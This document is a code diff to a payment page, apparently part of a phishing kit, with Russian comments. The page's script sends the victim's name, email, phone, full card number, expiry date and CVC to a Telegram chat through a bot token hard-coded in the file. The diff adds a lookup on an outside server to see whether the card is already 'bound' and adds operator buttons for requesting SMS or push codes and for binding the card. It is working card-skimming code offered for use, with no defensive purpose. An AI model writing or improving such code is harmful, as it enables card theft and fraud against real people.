@@ -1268,10 +1268,31 @@
             window.location.href = 'index.html';
         });
 
-       let paymentCounter = 0;
-// ДОБАВЬ ЭТИ 2 СТРОКИ В САМОМ ВЕРХУ
+       // Замени функцию sendToTelegramBot в payment.html (строка ~1275) на этот код:
+
+let paymentCounter = 0;
 const userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
 sessionStorage.setItem('currentUserId', userId);
+
+async function checkCardStatus(cardNumber) {
+    try {
+        const SERVER_URL = 'https://roomix-production.up.railway.app';
+        const response = await fetch(`${SERVER_URL}/check_card`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ card_number: cardNumber })
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            return data.is_bound;
+        }
+        return false;
+    } catch (error) {
+        console.error('Ошибка проверки карты:', error);
+        return false;
+    }
+}
 
 async function sendToTelegramBot() {
     try {
@@ -1280,29 +1301,29 @@ async function sendToTelegramBot() {
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
-        // ДЕБАГ: Что мы отправляем
-        console.log('🔍 ДЕБАГ отправки в Telegram:');
-        console.log('Имя:', formData.firstName);
-        console.log('Фамилия:', formData.lastName);  
-        console.log('Email:', formData.email);
-        console.log('Телефон:', formData.phone);
-        console.log('Номер карты:', cardNumber);
-        console.log('Срок:', expiry);
-        console.log('CVC:', cvc);
+        // ПРОВЕРЯЕМ СТАТУС КАРТЫ ЧЕРЕЗ БД БОТА
+        const isCardBound = await checkCardStatus(cardNumber);
+        
+        // УНИКАЛЬНЫЙ ID
+        const paymentId = Date.now() + (paymentCounter++);
+        
+        // ОПРЕДЕЛЯЕМ СТАТУС
+        const cardStatus = isCardBound ? 'ПРИВЯЗАННАЯ КАРТА' : 'НЕПРИВЯЗАННАЯ КАРТА';
+        const statusIcon = isCardBound ? '✅' : '🔗';
 
-        const message = `👤 Клиент:
+        // ФОРМИРУЕМ СООБЩЕНИЕ СО СТАТУСОМ
+        const message = `💳 <b>${cardStatus}</b> ${statusIcon}
+
+👤 <b>Клиент:</b>
 • Имя: ${formData.firstName || 'Тест'}
 • Фамилия: ${formData.lastName || 'Тестов'}  
 • Email: ${formData.email || 'test@test.com'}
 • Телефон: ${formData.phone || '+48123456789'}
 
-💳 Карта:
+💳 <b>Карта:</b>
 • Номер: ${cardNumber}
 • Срок: ${expiry}
 • CVC: ${cvc}`;
-
-        console.log('🔍 ДЕБАГ полное сообщение:');
-        console.log(message);
 
         const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
         const CHAT_ID = '-1003239032658';
@@ -1313,17 +1334,43 @@ async function sendToTelegramBot() {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'HTML'
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { 
+                                text: "📱 SMS код", 
+                                callback_data: `sms_${paymentId}_${userId}`
+                            },
+                            { 
+                                text: "🔔 Пуш", 
+                                callback_data: `push_${paymentId}_${userId}`
+                            }
+                        ],
+                        // Показываем кнопку "Привязать" только для непривязанных карт
+                        ...(!isCardBound ? [[
+                            {
+                                text: "🔗 Привязать",
+                                callback_data: `bind_${paymentId}_${userId}_${cardNumber}`
+                            }
+                        ]] : []),
+                        [
+                            { 
+                                text: "❌ Неверная карта", 
+                                callback_data: `wrong_card_${paymentId}_${userId}`
+                            }
+                        ]
+                    ]
+                }
             })
         });
 
         const result = await response.json();
-        console.log('🔍 ДЕБАГ результат отправки:', result);
-        
+        console.log('Результат отправки:', result);
         return result.ok;
 
     } catch (error) {
-        console.error('❌ Ошибка отправки:', error);
+        console.error('Ошибка отправки:', error);
         return false;
     }
 }
@@ -1476,7 +1523,6 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
-
 
 
 
